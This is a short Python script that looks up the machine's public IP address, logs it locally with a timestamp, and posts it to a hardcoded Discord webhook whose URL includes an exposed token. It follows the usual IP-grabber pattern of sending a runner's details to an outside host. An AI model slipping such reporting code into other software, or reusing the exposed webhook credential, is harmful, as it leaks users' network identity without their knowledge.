import requests
import datetime
import os
import sys

def log_and_send_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json()['ip']
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f'[{timestamp}] IP: {ip}'
        with open('ip_log.txt', 'a') as file:
            file.write(log_message + '\n')
        webhook_url = 'https://discord.com/api/webhooks/1327958291447414835/Yqjosf6qrsaFQb6mNO2UK3BmEBiBjiN6o-811Pp5rOvlOvxSoaGBpumVIXNVTHqOqBqU'
        data = {'content': log_message}
        requests.post(webhook_url, json=data)
        print(f'IP logged and sent: {log_message}')
    except Exception as error:
        print(f'Error: {error}')
    finally:
        os._exit(0)

if __name__ == '__main__':
    log_and_send_ip()